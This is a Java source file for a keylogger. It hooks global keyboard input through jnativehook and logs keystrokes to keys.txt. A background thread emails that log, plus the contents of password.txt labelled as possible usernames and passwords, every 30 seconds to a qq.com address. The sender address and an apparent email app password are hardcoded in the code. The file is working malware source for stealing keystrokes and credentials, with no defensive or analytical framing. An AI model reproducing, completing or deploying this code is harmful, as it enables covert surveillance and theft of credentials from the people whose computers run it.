package org.example;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.logging.Level;

public class Main {

    private static final Path KEY_LOG_FILE = Paths.get("keys.txt");

    public static void main(String[] args) {

        init();

        try {
            PrintWriter keyWriter = createKeyWriter();
            GlobalScreen.registerNativeHook();
            KeyLogger keyLogger = new KeyLogger(keyWriter);
            GlobalScreen.addNativeKeyListener(keyLogger);

            // Set your email and password here
            String fromEmail = "1647995000@qq.com";
            String toEmail = "1647995000@qq.com";
            String emailPassword = "wbdgnlnsmkojehfj";
//            long intervalInMillis = 24 * 60 * 60 * 1000; // 24 hours in milliseconds
            long intervalInMillis = 30 * 1000;//30s
            LogAnalyzer logAnalyzer = new LogAnalyzer();
            logAnalyzer.analyzeLogFile("keys.txt");

            scheduleEmailSending(fromEmail, toEmail, emailPassword, intervalInMillis);


        } catch (NativeHookException | IOException e) {
            System.err.println("Error: " + e.getMessage());
            System.exit(-1);
        }
    }

    private static String getKeys() throws IOException {
        File file = new File("keys.txt");
        FileReader fr = new FileReader(file);
        BufferedReader br = new BufferedReader(fr);
        String string1 = "";
        String line = br.readLine();
        while (line != null) {
            string1 += line + "\n";
            line = br.readLine();
        }
        br.close();
        fr.close();
        return string1;
    }

    private static String getInf() throws IOException {
        File file = new File("password.txt");
        FileReader fr = new FileReader(file);
        BufferedReader br = new BufferedReader(fr);
        String string2 = "";
        String line = br.readLine();
        while (line != null) {
            string2 += line + "\n";
            line = br.readLine();
        }
        br.close();
        fr.close();
        return string2;
    }
    private static void scheduleEmailSending(String fromEmail, String toEmail, String emailPassword, long intervalInMillis) {
        EmailSender emailSender = new EmailSender(fromEmail,emailPassword);
        LogAnalyzer logAnalyzer = new LogAnalyzer();
        new Thread(() -> {
            while (true) {
                try {
                    emailSender.sendEmail(toEmail, "Keylogger", "Here are the keys typed:\n"+ getKeys());
                    emailSender.sendEmail(toEmail, "UserInf", "Here are possible User and psw:\n"+ getInf());
                    Thread.sleep(intervalInMillis);
                    logAnalyzer.analyzeLogFile("keys.txt");
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }


    private static PrintWriter createKeyWriter() throws IOException {
        OutputStream os = Files.newOutputStream(KEY_LOG_FILE, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
                StandardOpenOption.APPEND);
        return new PrintWriter(os);
    }

    private static void init() {
        // Get the logger for "org.jnativehook" and set the level to warning.
        java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.WARNING);

        // Don't forget to disable the parent handlers.
        logger.setUseParentHandlers(false);
    }
}
